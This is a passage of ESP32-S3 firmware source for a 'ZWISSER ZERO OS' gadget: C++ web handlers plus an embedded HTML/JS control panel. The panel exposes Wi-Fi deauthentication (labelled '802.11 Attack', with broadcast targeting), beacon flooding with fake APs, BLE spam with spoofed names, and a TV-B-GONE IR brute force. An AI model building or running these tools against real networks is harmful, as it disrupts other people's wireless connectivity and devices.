        apClients, uptimeSec);
    return String(json);
}

void handleSystemStats() { server.send(200, "application/json", getSystemStatsJson()); }

// ===================== MUSIC API HANDLERS ==================
void handleMusicPlay() {
  if (musicPlaying) {
    server.send(200, "text/plain", "ALREADY PLAYING");
    return;
  }
  musicPlaying = true;
  musicNoteIndex = 0;
  lastMusicTick = 0;
  addLog("[MUSIC] Web play: %s", songNames[musicSongIndex]);
  server.send(200, "text/plain", "PLAYING");
}

void handleMusicStop() {
  if (!musicPlaying) {
    server.send(200, "text/plain", "ALREADY STOPPED");
    return;
  }
  musicPlaying = false;
  noTone(BUZZER_PIN);
  addLog("[MUSIC] Web stop");
  server.send(200, "text/plain", "STOPPED");
}

void handleMusicSelect() {
  if (server.hasArg("idx")) {
    int idx = server.arg("idx").toInt();
    if (idx >= 0 && idx < songCount) {
      musicSongIndex = idx;
      musicNoteIndex = 0;
      musicPlaying = false;
      noTone(BUZZER_PIN);
      addLog("[MUSIC] Web selected: %s", songNames[musicSongIndex]);
      server.send(200, "text/plain", "SELECTED");
      return;
    }
  }
  server.send(400, "text/plain", "ERR: invalid idx");
}

void handleMusicStatus() {
  char json[256];
  snprintf(json, sizeof(json), "{\"playing\":%s,\"songIndex\":%d,\"songName\":\"%s\"}",
    musicPlaying ? "true" : "false",
    musicSongIndex,
    songNames[musicSongIndex]);
  server.send(200, "application/json", json);
}

// ===================== HTML ===================================
const char* index_html PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>ZWISSER ZERO OS</title>
<style>
:root{--bg:#000;--fg:#0F0;--accent:#0F0;--accent2:#F00;--accent3:#FF6600;--accent4:#AA00FF;--border:#222;--card-bg:#0a0a0a;--dim:#555}
*{box-sizing:border-box;margin:0;padding:0}body{background:var(--bg);color:var(--fg);font-family:'Courier New',monospace;font-size:14px;min-height:100vh;display:flex;flex-direction:column}
.header{position:sticky;top:0;z-index:99;background:var(--bg);border-bottom:1px solid var(--border);padding:10px 14px;display:flex;justify-content:space-between;align-items:center}
.header h1{font-size:.9em;letter-spacing:2px;color:var(--fg)}.header h1 span.red{color:var(--accent2)}
.content{flex:1;padding:10px;display:none;margin-bottom:40px}.content.active{display:block!important}
.nav-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:20px 16px}
.nav-btn{border:1px solid var(--fg);background:var(--bg);color:var(--fg);padding:24px 8px;text-align:center;text-transform:uppercase;font-weight:700;font-size:.9em;letter-spacing:3px;cursor:pointer;transition:all .15s}
.nav-btn.red{border-color:var(--accent2);color:var(--accent2)}.nav-btn:active{background:var(--fg);color:var(--bg)}
.nav-btn.orange{border-color:var(--accent3);color:var(--accent3)}.nav-btn.purple{border-color:var(--accent4);color:var(--accent4)}
.card{border:1px solid var(--border);margin-bottom:8px}
.card-hdr{background:var(--card-bg);padding:6px 10px;border-bottom:1px solid var(--border);font-size:.75em;color:var(--fg)}
.card-body{padding:8px 10px}
.back-btn{background:none;border:1px solid #444;color:var(--fg);padding:4px 10px;font-family:inherit;font-size:.7em;cursor:pointer;display:none}
.footer{position:fixed;bottom:0;width:100%;background:var(--bg);border-top:1px solid var(--border);padding:6px 14px;display:flex;justify-content:space-between;font-size:.6em;color:var(--dim);z-index:98}
.toggle{position:relative;display:inline-block;width:40px;height:20px;margin-left:6px;vertical-align:middle}
.toggle input{opacity:0;width:0;height:0}
.toggle .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background:var(--border);border-radius:20px;transition:.3s}
.toggle .slider::before{content:"";position:absolute;height:14px;width:14px;left:3px;bottom:3px;background:var(--dim);border-radius:50%;transition:.3s}
.toggle input:checked+.slider{background:var(--fg)}.toggle input:checked+.slider::before{transform:translateX(20px);background:var(--bg)}
.toggle.red input:checked+.slider{background:var(--accent2)}.toggle.orange input:checked+.slider{background:var(--accent3)}.toggle.purple input:checked+.slider{background:var(--accent4)}
input[type=text],input[type=password],input[type=number],select{width:100%;background:var(--card-bg);border:1px solid var(--border);color:var(--fg);padding:7px 8px;font-family:inherit;font-size:.8em;outline:none}
input:focus,select:focus{border-color:var(--fg)}select option{background:var(--bg);color:var(--fg)}
.btn{display:inline-block;border:1px solid var(--fg);background:var(--bg);color:var(--fg);padding:7px 12px;font-family:inherit;font-size:.75em;text-transform:uppercase;letter-spacing:1px;cursor:pointer;transition:all .15s;margin:2px}
.btn:active{background:var(--fg);color:var(--bg);transform:scale(.95)}.btn-full{width:100%;text-align:center;padding:10px}
.btn-red{border-color:var(--accent2);color:var(--accent2)}.btn-red:active{background:var(--accent2);color:var(--bg)}
.btn-orange{border-color:var(--accent3);color:var(--accent3)}.btn-orange:active{background:var(--accent3);color:var(--bg)}
.btn-purple{border-color:var(--accent4);color:var(--accent4)}.btn-purple:active{background:var(--accent4);color:var(--bg)}
.btn-sm{padding:4px 8px;font-size:.65em}
.flex{display:flex;gap:6px;flex-wrap:wrap;align-items:center}.grow{flex:1}
.stat-row{display:flex;justify-content:space-between;padding:4px 0;font-size:.7em;border-bottom:1px solid var(--border)}.stat-row:last-child{border-bottom:none}
.stat-key{color:var(--dim);word-break:break-all;flex:1}.stat-val{color:var(--fg);white-space:nowrap;margin-left:8px}
.net-click{cursor:pointer;transition:all .15s}.net-click:active{background:var(--fg);color:var(--bg)}
.mt-6{margin-top:6px}.mb-6{margin-bottom:6px}.hint{font-size:.6em;color:var(--dim);margin-top:3px}
#connStatus{font-size:.55em;padding:2px 6px;border:1px solid var(--border);border-radius:2px;letter-spacing:1px;white-space:nowrap}
.status-tag{display:inline-block;padding:1px 8px;border-radius:2px;font-size:.7em;letter-spacing:1px}
.status-tag.on{border:1px solid var(--fg);color:var(--fg)}.status-tag.off{border:1px solid var(--accent2);color:var(--accent2)}
.status-tag.active{border:1px solid var(--accent3);color:var(--accent3);background:var(--card-bg)}
#logFloater{z-index:1000;position:fixed;bottom:36px;right:6px;width:300px;max-height:50vh;background:var(--card-bg);border:1px solid var(--border);border-radius:3px;display:none;flex-direction:column;font-size:.7em;box-shadow:0 0 10px rgba(0,255,0,.1)}
#logHdr{cursor:pointer;background:var(--border);padding:4px 8px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;user-select:none;flex-shrink:0}
#logHdr:hover{background:var(--dim)}#logHdr span{color:var(--fg);font-size:.75em;letter-spacing:1px}
#logHdr button{background:none;border:1px solid #444;color:var(--fg);padding:1px 6px;cursor:pointer;font-size:.7em;font-family:inherit}
#logBody{flex:1;overflow-y:auto;padding:4px 6px;min-height:80px;max-height:calc(50vh - 30px)}
#logBody::-webkit-scrollbar{width:3px}#logBody::-webkit-scrollbar-track{background:var(--card-bg)}#logBody::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
.log-line{padding:1px 0;border-bottom:1px solid var(--border);color:var(--dim);font-size:.8em;word-break:break-all;line-height:1.3}.log-line:last-child{border-bottom:none}
#statsToggleBtn{position:fixed;bottom:66px;right:6px;z-index:1001;background:var(--card-bg);border:1px solid var(--accent);color:var(--accent);padding:3px 8px;cursor:pointer;font-family:inherit;font-size:.65em;letter-spacing:1px}
#statsFloater{z-index:1000;position:fixed;bottom:66px;right:6px;width:300px;background:var(--card-bg);border:1px solid var(--border);border-radius:3px;display:none;flex-direction:column;font-size:.7em;box-shadow:0 0 10px rgba(0,255,0,.1)}
#statsHdr{cursor:pointer;background:var(--border);padding:4px 8px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;user-select:none;flex-shrink:0}
#statsHdr:hover{background:var(--dim)}#statsHdr span{color:var(--fg);font-size:.75em;letter-spacing:1px}
#statsBody{flex:1;overflow-y:auto;padding:4px 6px;min-height:80px;max-height:calc(50vh - 30px)}
#logToggleBtn{position:fixed;bottom:36px;right:6px;z-index:1001;background:var(--card-bg);border:1px solid var(--border);color:var(--fg);padding:3px 8px;cursor:pointer;font-family:inherit;font-size:.65em;letter-spacing:1px}
.theme-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:6px}
.theme-opt{border:1px solid var(--border);background:var(--card-bg);padding:8px 6px;text-align:center;cursor:pointer;font-family:inherit;font-size:.7em;letter-spacing:1px;color:var(--fg);transition:all .15s}
.theme-opt:active{transform:scale(.95)}.theme-opt.sel{border-color:var(--fg);box-shadow:0 0 6px var(--fg);font-weight:700}
.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:3px}
.stat-item{display:flex;flex-direction:column;padding:4px 6px;border:1px solid var(--border);border-radius:2px}
.stat-item .stat-label{font-size:.55em;color:var(--dim);text-transform:uppercase;letter-spacing:1px}
.stat-item .stat-value{font-size:.75em;color:var(--fg);margin-top:1px;font-weight:700}
.stat-item .stat-value.warn{color:var(--accent3)}.stat-item .stat-value.crit{color:var(--accent2)}.stat-item .stat-value.good{color:var(--fg)}
.ir-gree-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.ir-gree-item{display:flex;flex-direction:column;gap:3px}
.ir-gree-item label{font-size:.65em;color:var(--dim);text-transform:uppercase;letter-spacing:1px}
.ir-gree-temp{font-size:2em;text-align:center;color:var(--fg);padding:8px;border:1px solid var(--border);border-radius:2px;letter-spacing:2px}
.ir-countdown{font-size:1.2em;text-align:center;padding:4px;color:var(--accent3);letter-spacing:2px}
.ir-capture-result{font-size:.65em;color:var(--fg);padding:4px;border:1px solid var(--border);margin-top:4px}
.remote-list{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:15px}
.remote-card{background:#111;border:1px solid var(--border);border-radius:18px;padding:18px;transition:.2s;cursor:pointer;position:relative}
.remote-card:hover{transform:translateY(-3px);border-color:var(--accent)}
.remote-card-name{font-size:1rem;font-weight:bold}
.remote-card-info{opacity:.7;margin-top:5px;font-size:.8rem}
.remote-manage{position:absolute;top:12px;right:12px;display:flex;gap:6px}
.remote-viewer{width:360px;max-width:92vw}
.remote-viewer-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px}
.viewer-remote-name{font-size:1.1rem;font-weight:bold}
.viewer-sub{opacity:.6;font-size:.8rem}
.ir-remote{background:#111;border:2px solid var(--border);border-radius:28px;padding:16px;min-height:0;box-shadow:inset 0 0 25px rgba(255,255,255,.03),0 0 30px rgba(0,0,0,.5)}
.remote-screen{width:100%;height:45px;background:#0a0a0a;border:1px solid #333;border-radius:10px;display:flex;align-items:center;justify-content:center;margin-bottom:14px}
.remote-screen-text{color:#00ff88;font-size:.8rem;letter-spacing:2px}
.ir-remote-buttons{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
.ir-btn{aspect-ratio:1/1;background:#1c1c1c;border:1px solid #333;border-radius:16px;display:flex;align-items:center;justify-content:center;color:white;text-align:center;cursor:pointer;transition:.2s;padding:6px;font-size:.75rem}
.ir-btn:hover{transform:scale(1.05);border-color:var(--accent)}
.ir-add-btn{margin-top:12px!important}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.75);display:flex;align-items:center;justify-content:center;z-index:9999}
.modal-box{width:340px;background:#111;border:1px solid var(--border);border-radius:18px;padding:20px}
.modal-title{font-weight:bold;margin-bottom:15px}
.hidden{display:none!important}
</style></head><body>
<div class="header"><div class="left"><button class="back-btn" id="backBtn" onclick="goHome()"><- BACK</button><h1>ZWISSER ZERO <span class="red">//</span> <span id="modLabel">OS</span></h1></div><span id="connStatus">WAITING</span></div>
<div id="page-home" class="content active"><div class="nav-grid">
<div class="nav-btn" onclick="showModule('wifi')">WIFI</div><div class="nav-btn red" onclick="showModule('bt')">BT</div>
<div class="nav-btn orange" onclick="showModule('deauth')">DEAUTH</div><div class="nav-btn orange" onclick="showModule('beacon')">BEACON</div>
<div class="nav-btn purple" onclick="showModule('blespam')">BLE SPAM</div><div class="nav-btn purple" onclick="showModule('bleopts')">BLE OPTS</div>
<div class="nav-btn orange" onclick="showModule('probe')">PROBE</div><div class="nav-btn orange" onclick="showModule('hop')">HOP</div>
<div class="nav-btn" onclick="showModule('config')">CONFIG</div>
<div class="nav-btn" onclick="showModule('irhub')" style="border-color:var(--accent3);color:var(--accent3)">IR HUB</div>
<div class="nav-btn" onclick="showModule('themes')" style="border-color:var(--accent4);color:var(--accent4)">THEMES</div>
<div class="nav-btn" onclick="showModule('power')" style="border-color:#444;color:#888">POWER</div>
<div class="nav-btn" onclick="showModule('music')" style="border-color:var(--fg);color:var(--fg)">MUSIC</div>
</div></div>

<div id="page-wifi" class="content"><div class="card"><div class="card-hdr">// RADIO CONTROL</div><div class="card-body">
<div class="flex" style="justify-content:space-between;align-items:center"><span style="font-size:.75em;color:var(--dim)">Radio</span><label class="toggle"><input type="checkbox" id="wifiRadioToggle" onchange="wifiRadioToggle()" checked><span class="slider"></span></label></div>
<p id="wifiRadioStatus" style="font-size:.7em;margin-top:10px;color:var(--dim)">AP ACTIVE</p></div></div>
<div class="card"><div class="card-hdr">// SAVED NETWORK <span style="font-size:.7em;color:var(--dim)">Auto-Connect</span></div><div class="card-body">
<div id="savedNetInfo" style="font-size:.7em;color:var(--dim);margin-bottom:6px">Loading...</div>
<div class="flex"><button class="btn btn-red" onclick="wifiForgetNet()" style="flex:1">FORGET</button><button class="btn" onclick="wifiConnectSaved()" style="flex:1">CONNECT</button></div>
<div id="savedNetResult" class="mt-6" style="font-size:.7em;color:var(--dim)"></div></div></div>
<div class="card"><div class="card-hdr">// SCAN <span style="font-size:.7em;color:var(--dim)">Real Networks</span></div><div class="card-body">
<button class="btn btn-full" id="wifiScanBtn" onclick="wifiScanNetworks()">SCAN</button>
<div id="wifiNetList" class="mt-6" style="max-height:280px;overflow-y:auto;border:1px solid var(--border);padding:3px"></div>
<div id="wifiScanCount" style="font-size:.6em;color:var(--dim);margin-top:3px"></div></div></div>
<div class="card"><div class="card-hdr">// STATION <span style="font-size:.7em;color:var(--dim)">Connect & Save</span></div><div class="card-body">
<input type="text" id="staSsidInput" placeholder="SSID..." class="mb-6">
<div class="flex mb-6"><input type="password" id="staPassInput" placeholder="Password..." style="flex:1;background:var(--card-bg);border:1px solid var(--border);color:var(--fg);padding:7px 8px;font-family:inherit;font-size:.8em;outline:none"><button class="btn btn-sm" onclick="togglePass('staPassInput','staPassToggle')" id="staPassToggle" style="min-width:44px">SHOW</button></div>
<button class="btn btn-full" onclick="wifiConnectAndSave()">CONNECT & SAVE</button>
<div id="wifiConnectResult" class="mt-6" style="font-size:.7em;color:var(--dim)"></div></div></div>
<div class="card"><div class="card-hdr">// AP CONFIG <span style="font-size:.7em;color:var(--dim)">Save</span></div><div class="card-body">
<input type="text" id="apSsidInput" placeholder="AP SSID..." class="mb-6">
<div class="flex mb-6"><input type="password" id="apPassInput" placeholder="AP Password..." style="flex:1;background:var(--card-bg);border:1px solid var(--border);color:var(--fg);padding:7px 8px;font-family:inherit;font-size:.8em;outline:none"><button class="btn btn-sm" onclick="togglePass('apPassInput','apPassToggle')" id="apPassToggle" style="min-width:44px">SHOW</button></div>
<button class="btn btn-full" onclick="wifiSaveConfig()">SAVE</button>
<div id="wifiConfigResult" class="mt-6" style="font-size:.7em;color:var(--dim)"></div></div></div></div>

<div id="page-bt" class="content"><div class="card"><div class="card-hdr">// RADIO</div><div class="card-body">
<div class="flex"><span style="font-size:.75em;color:var(--dim)">BT Radio</span><label class="toggle"><input type="checkbox" id="btRadioToggle" onchange="btRadioToggle()"><span class="slider"></span></label><span id="btRadioStatus" style="font-size:.65em;color:var(--accent2)">OFF</span></div></div></div>
<div class="card"><div class="card-hdr">// SNIFF <span style="font-size:.7em;color:var(--dim)">BLE Scan</span></div><div class="card-body">
<button class="btn btn-full" id="bleScanBtn" onclick="bleSniff()">START SCAN</button>
<div id="bleScanList" class="mt-6" style="max-height:260px;overflow-y:auto;border:1px solid var(--border);padding:3px"></div>
<div class="hint" style="text-align:center">Click to pair</div>
<div id="bleScanCount" style="font-size:.6em;color:var(--dim);margin-top:3px"></div><div id="blePairResult" class="mt-6" style="font-size:.7em;color:var(--dim);text-align:center"></div></div></div>
<div class="card"><div class="card-hdr">// MANAGED</div><div class="card-body">
<button class="btn btn-full" onclick="btRefreshPaired()">REFRESH</button>
<div id="btPairedList" class="mt-6" style="max-height:200px;overflow-y:auto;border:1px solid var(--border);padding:3px"></div>
<div id="btUnpairResult" class="mt-6" style="font-size:.7em;color:var(--dim);text-align:center"></div></div></div>
<div class="card"><div class="card-hdr">// NAME</div><div class="card-body">
<input type="text" id="btNameInput" placeholder="BT Name..." class="mb-6">
<button class="btn btn-full" onclick="btSaveName()">SAVE</button>
<div id="btNameResult" class="mt-6" style="font-size:.7em;color:var(--dim)"></div></div></div></div>

<div id="page-power" class="content"><div class="card"><div class="card-hdr">// POWER</div><div class="card-body">
<button class="btn btn-full btn-red" onclick="systemReboot()" style="margin-bottom:6px">REBOOT</button>
<button class="btn btn-full btn-red" onclick="systemReset()" style="margin-bottom:6px">FACTORY RESET</button>
<div id="powerResult" class="mt-6" style="font-size:.7em;color:var(--dim);text-align:center"></div></div></div></div>

<div id="page-config" class="content"><div class="card"><div class="card-hdr">// SYSTEM</div><div class="card-body"><div style="font-size:.65em;color:var(--dim)">
<div class="stat-row"><span class="stat-key">AP SSID</span><span class="stat-val" id="cfgApSsid">--</span></div>
<div class="stat-row"><span class="stat-key">Saved Network</span><span class="stat-val" id="cfgSavedNet">None</span></div>
<div class="stat-row"><span class="stat-key">Theme</span><span class="stat-val" id="cfgTheme">--</span></div>
<div class="stat-row"><span class="stat-key">Uptime</span><span class="stat-val" id="cfgUptime">--</span></div></div></div></div></div>

<div id="page-themes" class="content"><div class="card"><div class="card-hdr">// THEME <span style="font-size:.7em;color:var(--accent4)">Choose Your Vibe</span></div><div class="card-body">
<p style="font-size:.65em;color:var(--dim);margin-bottom:6px">Apply instantly. Saved to flash.</p>
<div class="theme-grid" id="themeGrid"></div><div id="themeResult" class="mt-6" style="font-size:.7em;color:var(--fg);text-align:center"></div></div></div></div>

<div id="page-deauth" class="content"><div class="card"><div class="card-hdr">// DEAUTH <span style="font-size:.7em;color:var(--accent3)">802.11 Attack</span></div><div class="card-body">
<p style="font-size:.65em;color:var(--dim);margin-bottom:8px">Sends deauth frames. Broadcast MAC = all clients.</p>
<div class="flex mb-6"><span style="font-size:.75em;color:var(--dim)">Status:</span><span id="deauthStatus" class="status-tag off">OFF</span></div>
<div style="font-size:.75em;color:var(--dim);margin-bottom:3px">Target MAC:</div><input type="text" id="deauthTargetMac" placeholder="FF:FF:FF:FF:FF:FF" class="mb-6">
<div style="font-size:.75em;color:var(--dim);margin-bottom:3px">AP BSSID:</div><input type="text" id="deauthApMac" placeholder="00:00:00:00:00:00" class="mb-6">
<div class="flex mb-6"><span style="font-size:.75em;color:var(--dim)">Channel:</span><input type="number" id="deauthChannel" value="1" min="1" max="13" style="width:60px;flex:none"></div>
<div class="flex mb-6"><span style="font-size:.75em;color:var(--dim)">Rate (ms):</span><input type="number" id="deauthRate" value="50" min="1" max="1000" style="width:70px;flex:none"></div>
<div class="flex mb-6"><span style="font-size:.75em;color:var(--dim)">Reason:</span><select id="deauthReason" style="width:140px;flex:none"><option value="7">Class 3 (7)</option><option value="1">Unspecified (1)</option><option value="4">Disassociated (4)</option><option value="5">Auth Leave (5)</option><option value="8">Deauth Leave (8)</option><option value="3">CHANGED (3)</option></select></div>
<div class="flex mb-6"><label class="toggle red"><input type="checkbox" id="deauthAllCh"><span class="slider"></span></label><span style="font-size:.7em;color:var(--dim)">All Channels</span></div>
<button class="btn btn-red btn-full" id="deauthStartBtn" onclick="deauthToggle()">START DEAUTH</button>
<div id="deauthResult" class="mt-6" style="font-size:.7em;color:var(--dim);text-align:center"></div></div></div></div>

<div id="page-beacon" class="content"><div class="card"><div class="card-hdr">// BEACON FLOOD <span style="font-size:.7em;color:var(--accent3)">AP Spam</span></div><div class="card-body">
<p style="font-size:.65em;color:var(--dim);margin-bottom:8px">Creates many fake APs with spoofed encryption.</p>
<div class="flex mb-6"><span style="font-size:.75em;color:var(--dim)">Status:</span><span id="beaconStatus" class="status-tag off">OFF</span></div>

<!-- ===================== SECTION: IR ATTACKS (hidden initially) ===================== -->
<div id="attacksSection" class="content" style="display:none">
<div class="card"><div class="card-hdr">// ⚡ IR ATTACKS <span style="font-size:.7em;color:var(--accent2)">Brute Force & Exploits</span></div><div class="card-body">
<!-- TV-B-GONE -->
<div class="card"><div class="card-hdr">// TV-B-GONE <span style="font-size:.7em;color:var(--accent2)">Brute Force</span></div><div class="card-body">
<p style="font-size:.65em;color:var(--dim);margin-bottom:6px">Cycles common TV power codes to turn off TVs.</p>
<div class="flex" style="justify-content:space-between"><span style="font-size:.75em;color:var(--dim)">Status:</span><span id="tvbgoneStatus" class="status-tag off">OFF</span></div>
<button class="btn btn-red btn-full mt-6" id="tvbgoneBtn" onclick="tvbgoneToggle()">START TV-B-GONE</button></div></div>
</div></div>
</div>

</div>

<div id="page-bleopts" class="content"><div class="card"><div class="card-hdr">// NAME RANDOMIZER <span style="font-size:.7em;color:var(--accent4)">Spoof</span></div><div class="card-body">
<p style="font-size:.65em;color:var(--dim);margin-bottom:6px">Randomizes device names per adv. Applies to all BLE spam.</p>
<div class="flex" style="justify-content:space-between"><span style="font-size:.75em;color:var(--dim)">Status:</span><span id="nameRandStatus" class="status-tag off">OFF</span></div>
<button class="btn btn-purple btn-full mt-6" id="nameRandStartBtn" onclick="nameRandToggle()">TOGGLE</button></div></div>
<div class="card"><div class="card-hdr">// STOP ALL <span style="font-size:.7em;color:var(--accent2)">Emergency</span></div><div class="card-body">
<p style="font-size:.65em;color:var(--dim);margin-bottom:6px">Stops ALL BLE spam immediately.</p>
<button class="btn btn-red btn-full" onclick="stopAllBleSpam()">STOP ALL BLE SPAM</button>
<div id="stopAllResult" class="mt-6" style="font-size:.7em;color:var(--dim);text-align:center"></div></div></div></div>

<div id="page-music" class="content"><div class="card"><div class="card-hdr">// MUSIC PLAYER <span style="font-size:.7em;color:var(--fg)">Buzzer Tunes</span></div><div class="card-body">
<p style="font-size:.65em;color:var(--dim);margin-bottom:8px">Plays melodies on the passive buzzer (GPIO 6).</p>
<div class="flex mb-6" style="justify-content:space-between;align-items:center">
  <span id="musicStatus" class="status-tag off" style="font-size:.75em">STOPPED</span>
  <span id="musicNow" style="font-size:.7em;color:var(--dim)">Select a song</span>
</div>
<div id="musicList" class="mt-6" style="max-height:340px;overflow-y:auto;border:1px solid var(--border);padding:3px"></div>
<button class="btn btn-full mt-6" id="musicPlayBtn" onclick="musicTogglePlay()" style="border-color:var(--accent3);color:var(--accent3)">PLAY</button>
</div></div></div>

<div class="footer"><span id="fUptime">UPTIME: 00:00:00</span><span>ZWISSER ZERO v4.0</span></div>
<button id="statsToggleBtn" onclick="toggleStatsFloater()">STATS</button>
<button id="logToggleBtn" onclick="toggleLogFloater()">LOG</button>
<div id="statsFloater"><div id="statsHdr" onclick="closeStats()"><span>// SYSTEM STATS</span><span style="font-size:.65em;color:var(--dim)">ESP32-S3</span></div><div id="statsBody"><div class="stats-grid" id="statsGrid">
<div class="stat-item"><span class="stat-label">TEMP</span><span class="stat-value" id="stTemp">--</span></div>
<div class="stat-item"><span class="stat-label">CPU</span><span class="stat-value" id="stCpu">--</span></div>
<div class="stat-item"><span class="stat-label">RAM</span><span class="stat-value" id="stRam">--</span></div>
<div class="stat-item"><span class="stat-label">PSRAM</span><span class="stat-value" id="stPsram">--</span></div>
<div class="stat-item"><span class="stat-label">SKETCH</span><span class="stat-value" id="stSketch">--</span></div>
<div class="stat-item"><span class="stat-label">WiFi</span><span class="stat-value" id="stWifi">--</span></div>
<div class="stat-item"><span class="stat-label">CHIP</span><span class="stat-value" id="stChip">--</span></div>
<div class="stat-item"><span class="stat-label">CLIENTS</span><span class="stat-value" id="stClients">--</span></div>
<div class="stat-item" style="grid-column:1/-1"><span class="stat-label">IP</span><span class="stat-value" id="stIp" style="font-size:.65em">--</span></div></div></div></div>
<div id="logFloater"><div id="logHdr" onclick="closeLog()"><span>// SYSTEM LOG</span><button onclick="event.stopPropagation();clearLog()">CLR</button></div><div id="logBody"></div></div>

<script>
const THEMES = [
  {n:'Matrix',bg:'#000',fg:'#0F0',a:'#0F0',a2:'#F00',a3:'#FF6600',a4:'#AA00FF',b:'#222',c:'#0a0a0a',d:'#555'},
  {n:'Cyberpunk',bg:'#0a0015',fg:'#FF00FF',a:'#00FFFF',a2:'#FF0044',a3:'#FF8800',a4:'#8800FF',b:'#331045',c:'#150025',d:'#888'},
  {n:'Hacker',bg:'#1a0d00',fg:'#FFB000',a:'#FFB000',a2:'#FF3300',a3:'#FF6600',a4:'#B06000',b:'#3a2d10',c:'#1f1200',d:'#886644'},
  {n:'Deep Blue',bg:'#000511',fg:'#00CCFF',a:'#00AAFF',a2:'#FF0044',a3:'#FF8800',a4:'#6600FF',b:'#002244',c:'#001020',d:'#446688'},
  {n:'Synthwave',bg:'#0d0015',fg:'#FF44FF',a:'#00FFCC',a2:'#FF0044',a3:'#FFCC00',a4:'#FF44FF',b:'#2a1140',c:'#180020',d:'#8866AA'},
  {n:'Blood Dragon',bg:'#0d0000',fg:'#FF2200',a:'#FF0044',a2:'#FF0000',a3:'#FF4400',a4:'#880022',b:'#331111',c:'#180505',d:'#664444'},
  {n:'Night Vision',bg:'#001505',fg:'#33FF33',a:'#00FF44',a2:'#FF0033',a3:'#FF8800',a4:'#00FF88',b:'#002210',c:'#001505',d:'#446644'},
  {n:'Ghost',bg:'#111',fg:'#CCC',a:'#00AAFF',a2:'#FF3333',a3:'#FF8800',a4:'#AA44FF',b:'#333',c:'#1a1a1a',d:'#666'}
];
function applyTheme(idx){const t=THEMES[idx];if(!t)return;const r=document.documentElement.style;r.setProperty('--bg',t.bg);r.setProperty('--fg',t.fg);r.setProperty('--accent',t.a);r.setProperty('--accent2',t.a2);r.setProperty('--accent3',t.a3);r.setProperty('--accent4',t.a4);r.setProperty('--border',t.b);r.setProperty('--card-bg',t.c);r.setProperty('--dim',t.d);document.querySelectorAll('.theme-opt').forEach((el,i)=>{el.classList.toggle('sel',i===idx);});}
function loadTheme(){fetch('/api/theme').then(r=>r.text()).then(t=>{const idx=parseInt(t)||0;applyTheme(idx);if(document.getElementById('cfgTheme'))document.getElementById('cfgTheme').textContent=THEMES[idx].n;}).catch(()=>{});}
function setTheme(idx){fetch('/api/theme?idx='+idx).then(r=>r.text()).then(t=>{applyTheme(idx);document.getElementById('themeResult').textContent=THEMES[idx].n+' APPLIED';if(document.getElementById('cfgTheme'))document.getElementById('cfgTheme').textContent=THEMES[idx].n;}).catch(()=>{});}
function renderThemes(){const g=document.getElementById('themeGrid');if(!g)return;g.innerHTML='';THEMES.forEach((t,i)=>{const b=document.createElement('button');b.className='theme-opt';b.textContent=t.n;b.style.background=t.c;b.style.color=t.fg;b.style.borderColor=t.b;b.onclick=function(){setTheme(i);};g.appendChild(b);});}
function fetchSystemStats(){fetch('/api/system/stats').then(r=>r.json()).then(d=>{const t=document.getElementById('stTemp');if(t){t.textContent=d.tempC.toFixed(1)+'°C';t.className='stat-value'+(d.tempC>60?' crit':d.tempC>45?' warn':' good');}const c=document.getElementById('stCpu');if(c){c.textContent=d.cpuFreq+' MHz / '+d.cpuCores+'C';c.className='stat-value good';}const r=document.getElementById('stRam');if(r){const p=Math.round((1-d.freeHeap/d.totalHeap)*100);r.textContent=d.freeHeapStr+' / '+d.totalHeapStr;r.className='stat-value'+(p>85?' crit':p>70?' warn':' good');}const p=document.getElementById('stPsram');if(p){p.textContent=d.totalPsram>0?d.freePsramStr+' / '+d.totalPsramStr:'N/A';p.className='stat-value'+(d.totalPsram>0?' good':' good');}const s=document.getElementById('stSketch');if(s){s.textContent=d.freeSketchStr;s.className='stat-value good';}const w=document.getElementById('stWifi');if(w){w.textContent=d.wifiRssi!=='N/A'?d.wifiRssi+' ('+d.wifiMode+')':d.wifiMode;w.className='stat-value good';}const h=document.getElementById('stChip');if(h){h.textContent=d.chipModel+' rev'+d.chipRev;h.className='stat-value good';}const l=document.getElementById('stClients');if(l){l.textContent=d.apClients+' connected';l.className='stat-value good';}const i=document.getElementById('stIp');if(i){i.textContent=d.wifiIp;i.className='stat-value good';}}).catch(()=>{});}
setInterval(fetchSystemStats,5000);setTimeout(fetchSystemStats,300);

function wifiCheckSaved(){fetch('/api/wifi/saved').then(r=>r.text()).then(t=>{const el=document.getElementById('savedNetInfo');if(t&&t!=''){el.textContent='Saved: '+t;el.style.color='var(--fg)';if(document.getElementById('cfgSavedNet'))document.getElementById('cfgSavedNet').textContent=t;}else{el.textContent='No saved network.';el.style.color='var(--dim)';if(document.getElementById('cfgSavedNet'))document.getElementById('cfgSavedNet').textContent='None';}}).catch(()=>{});}
function wifiConnectAndSave(){const s=document.getElementById('staSsidInput').value.trim(),p=document.getElementById('staPassInput').value.trim(),r=document.getElementById('wifiConnectResult');if(!s){r.textContent='SSID required.';return;}r.textContent='Connecting & saving...';r.style.color='#aa0';fetch('/api/wifi/connect?ssid='+encodeURIComponent(s)+'&pass='+encodeURIComponent(p)+'&save=1').then(r=>r.text()).then(t=>{r.textContent=t;r.style.color=t.indexOf('CONNECTED')>=0?'var(--fg)':'var(--accent2)';if(t.indexOf('CONNECTED')>=0)wifiCheckSaved();}).catch(()=>{r.textContent='ERR';r.style.color='var(--accent2)';});}
function wifiConnectSaved(){const r=document.getElementById('savedNetResult');r.textContent='Connecting...';r.style.color='#aa0';fetch('/api/wifi/connect_saved').then(r=>r.text()).then(t=>{r.textContent=t;r.style.color=t.indexOf('CONNECTED')>=0?'var(--fg)':'var(--accent2)';}).catch(()=>{r.textContent='ERR';r.style.color='var(--accent2)';});}
